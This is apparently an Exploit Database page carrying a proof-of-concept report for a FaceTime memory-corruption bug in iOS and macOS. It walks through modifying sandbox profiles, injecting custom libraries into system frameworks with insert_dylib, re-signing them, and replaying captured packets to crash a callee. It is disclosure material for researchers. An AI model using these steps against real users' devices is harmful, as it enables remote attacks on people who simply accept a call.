Additional crash dumps are attached.

This bug can be reached if a user accepts a call from a malicious caller. This issue only affects FaceTime on iOS and Mac. I tested on iOS 12.1.1 and Mac OS X 10.13.6.

To reproduce issue on a Mac:

1) Add the line:

	(subpath "/out")

to the (allow file-read* file-write* section of  /System/Library/Sandbox/Profiles/com.apple.avconferenced.sb

2) Add the line:

	(allow file-read* file-write*
		(subpath "/out"))

to com.apple.identityservicesd.sb and restart the host

3) Compile video-replay-avc.cpp using:

	g++ -std=c++11 -g -dynamiclib -o librecord.so video-replay-avc.cpp

4) Copy the output lib, librecord.so to /usr/lib/libSP.so

5) Sign the library by calling:

	sudo codesign -f -s - /usr/lib/libSP.so

6) Compile video-replay-identity.cpp using:

	g++ -std=c++11 -g -dynamiclib -o librecord_IDS.so video-replay-identity.cpp

7) Copy the output lib, librecord_IDS.so to /usr/lib/libSP_IDS.so

8) Sign the library by calling:

	sudo codesign -f -s - /usr/lib/libSP_IDS.so

9) Download and build https://github.com/Tyilo/insert_dylib

10) Copy /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference to a local directory and run the command below.

	insert_dylib --strip-codesig /usr/lib/libSP.so AVConference

11) Copy AVConference_patched to /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference

12) Sign the binary by calling:

	sudo codesign -f -s - /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference

13) Copy /System/Library/PrivateFrameworks/IDSFoundation.framework/Versions/Current/IDSFoundation to a local directory and run the command below.

	insert_dylib --strip-codesig /usr/lib/libSP_IDS.so IDSFoundation

14) Run the following commands, quickly, in sequence:

	sudo cp IDSFoundation_patched /System/Library/PrivateFrameworks/IDSFoundation.framework/Versions/Current/IDSFoundation
	sudo codesign -f -s - /System/Library/PrivateFrameworks/IDSFoundation.framework/Versions/Current/IDSFoundation

NOTE: If you are too slow, the terminal may crash because it detects IDSFoundation is unsigned. If this happens, open up the terminal and try the codesign call again. The terminal usually stays open a second or two before it crashes.

15) Extract out.zip into /out and make it world readable

16) Kill the avconferenced and identityservicesd processes. They will restart automatically

17) Make a FaceTime call to the target.

I performed these steps on a MacBook Air running 10.14.1

Taking a second look at this, the root cause of this issue is probably an overflow in splitting RED packets:

0   libsystem_platform.dylib      	0x00007fff7d106164 _platform_memmove$VARIANT$Haswell + 580

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
